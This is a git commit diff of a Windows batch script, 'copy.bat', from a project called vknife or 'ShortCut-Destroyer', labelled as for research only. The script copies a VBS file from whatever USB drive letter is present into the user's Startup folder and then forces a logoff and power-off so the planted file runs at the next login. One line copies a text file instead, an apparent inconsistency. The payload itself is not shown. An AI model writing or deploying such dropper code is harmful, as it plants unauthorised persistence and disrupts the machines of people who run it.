c18e88355e1300dc1620c89f2c16b25a4bf27178
Henry Samuelson <hsamuelson@users.noreply.github.com>
2019-01-23 00:10:33 -0500

    Updated startup bug.
    Program is now fully functional

--- copy.bat
+++ copy.bat
@@ -1,18 +1,22 @@
 REM +++++++++++++++++
 REM |    vknife     |
 REM +++++++++++++++++
+REM
+REM *~ ShortCut-Destroyer ~*
+REM
 REM For resarch porposes only
+REM
+REM Henry Samuelson, Christopher Hansen 
 
 REM test sources, bc we dont know what the USB drive will be named by the system
-xcopy /s D:\short.vbs "c:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
-xcopy /s E:\short.vbs "c:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
-xcopy /s F:\short.vbs "c:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
-xcopy /s G:\short.vbs "c:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+xcopy /s D:\short.vbs "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+xcopy /s E:\pocketwatch.txt "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+xcopy /s F:\short.vbs "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+xcopy /s G:\short.vbs "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
 REM this shouldnt happen but if the drive is named weird
-xcopy /s A:\short.vbs "c:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
-xcopy /s B:\short.vbs "c:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
-
+xcopy /s A:\short.vbs "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+xcopy /s B:\short.vbs "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 REM then reboot system to run the startup applications
 shutdown /l
 shutdown /p
